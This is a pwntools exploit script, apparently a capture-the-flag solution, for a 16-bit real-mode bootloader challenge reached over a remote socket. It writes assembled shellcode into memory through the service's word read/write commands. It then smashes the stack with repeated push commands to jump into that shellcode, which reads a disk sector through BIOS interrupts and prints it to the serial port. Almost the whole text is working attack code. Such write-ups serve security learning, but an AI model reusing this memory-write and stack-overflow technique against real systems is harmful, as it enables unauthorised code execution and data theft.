from pwn import *

disk_path = "/tmp/boot.bin"
context.arch = "i386"

# io = process(["qemu-system-i386", "-s", "-display", "none", "-serial", "mon:stdio", disk_path])
if args.REMOTE:
    io = remote("frp.athdesk.me", 11339)
elif args.DOCKER:
    io = remote("localhost", 1339)
else:
    io = remote("localhost", 1337)

def rl():
    return io.recvuntil(b"\r\n").strip()

def sl(b):
    io.send(b + b"\r")
    # echo
    n = len(b) + 1
    while n > 0:
        n -= len(io.recv(1))


def write_word(what, to):
    # to is an address [0x0000, 0xffff]
    # we have to send an offset from 0x6000, divided by 2
    # because we are writing 2 bytes at a time
    # so we have to send (to - 0x6000) / 2
    if to < 0x6000:
        to += 2
    slot = ((to - 0x6000) % 0xffff) // 2
    target_slot = hex(slot)[2:].rjust(4, "0")
    cmd = f"w {target_slot}".encode()

    io.recvuntil(b"> ")
    sl(cmd)
    io.recvuntil(b"hexword]> ")

    target_val = hex(what)[2:].rjust(4, "0")
    info(f"Sending {target_val} -> {target_slot}")
    sl(target_val.encode())

def read_word(from_):
    slot = ((from_ - 0x6000) % 0xffff) // 2
    target_slot = hex(slot)[2:].rjust(4, "0")
    cmd = f"r {target_slot}".encode()

    io.recvuntil(b"> ")
    sl(cmd)
    ss = rl()
    info(f"Reading {target_slot} -> {ss.decode()}")
    return int(ss.decode(), 16)


def write_contiguous(pl, to=0x6000):
    word_list = []
    for i in range(0, len(pl), 2):
        word_list.append(u16(pl[i:i+2]))
    for w in word_list:
        write_word(w, to)
        to += 2

def comm_test():
    io.recvuntil(b"> ")
    sl(b"R 0000")
    ss = rl()
    info(ss.decode())

    io.recvuntil(b"> ")
    sl(b"W 0000")
    io.recvuntil(b"hexword]> ")
    sl(b"dead")

    io.recvuntil(b"> ")
    sl(b"R 0000")
    ss = rl()
    info(ss.decode())
    input()

# This real mode 16-bits shellcode will read the second sector of the disk using BIOS Apis
# https://stanislavs.org/helppc/int_13-2.html

shellcode = """
; org 0x6000
bits 16

nop
nop
nop
nop

mov ah, 2
mov al, 1
mov bx, 0x7080 ; <- target address
mov cx, 0x0002     ; <- cyl:sector
mov dx, 0x0080    ; <- head:disk number ( or 0x80 to indicate hdd and not floppy)
int 0x13

mov bx, 0x7080
loop:
    mov al, [bx]
    mov dx, 0x3f8 ; putc(al)
    out dx, al
    inc bx
    cmp bx, 0x7100
        jne loop


hlt
"""

open("shellcode.S", "w").write(shellcode)
info("Assembling shellcode...")
os.system("nasm -f bin shellcode.S -o /tmp/payload")
payload = open("/tmp/payload", "rb").read()
write_contiguous(payload, to=0x6000)

# execute the shellcode by doing a stack overflow into code
# writing a jump to our shellcode, while keeping in mind that
# `main`'s address is pushed alongside a word controlled by us, every single time
# we trigger it by calling `putc`

npush = 0

def push(word):
    global npush
    slot = ((word - 0x6000) % 0xffff) // 2
    target_slot = hex(slot)[2:].rjust(4, "0")
    cmd = f"X {target_slot}".encode()

    io.recvuntil(b"> ")
    sl(flat({0:cmd}, length=60))
    rl()
    info(f"Smashing.... {hex(0x8000 - (npush*4))} -> {hex(word)}")
    npush += 1

def pushslot(slot):
    global npush
    target_slot = hex(slot)[2:].rjust(4, "0")
    cmd = f"X {target_slot}".encode()

    io.recvuntil(b"> ")
    sl(cmd)
    rl()
    info(f"Smashing.... {hex(0x8000 - (npush*4))} -> SLOT {hex(slot)}")
    npush += 1

write_word(0x6000, 0x4100) # we can put `sp` to 0x4100 and ret, so we have to put the address of the shellcode there

for i in range(125):
    pushslot(0x0)

# on top of our junk, 32 bytes are also clobbered with something
# but instructions are instructions generally
# segfault? what segfault? we're in real mode baby

# now we can shellcode using 1-byte instructions, and only using words that are even :skull:
# but we can do some magic to get around that (jump to an odd address using the high byte (argument to a `jl` instruction))


# sometimes i have to put +2 because idk it gets decremented

push(0xc300)    # the high byte* here gets executed if the jl $+3 takes ( ret )
push(0x00bc + 2)    # mov sp, XX00 (XX = 41) < 
# push(0x0390)       # this one contains the offset for the taken jl ( for some reason this becomes 0x038e ??? but gets executed wholly )
# for some reason this setup takes a `jl` to 0x7e02, which is occupied by this instruction ( which is a `pop ax` cause it has to be even lol )
push(0x0059) # pop cx ; lol i cant


push(0x0056) # push si
push(0x004e) # dec si ( si -> -1 ) ; cant do this either
push(0x004e) # dec si ( si -> 9 )
push(0x004e) # dec si ( si -> 1 )


push(0x0060); # pop ax ( in this setup $sp - 2 == 0x6000)
push(0x0060); # pop ax

# while True:
io.send('aasdadsad')
    # input("enter>")

# flag = io.recv(timeout=3) + io.recv(timeout=3)
# info(f"Flag: {flag}")

io.interactive()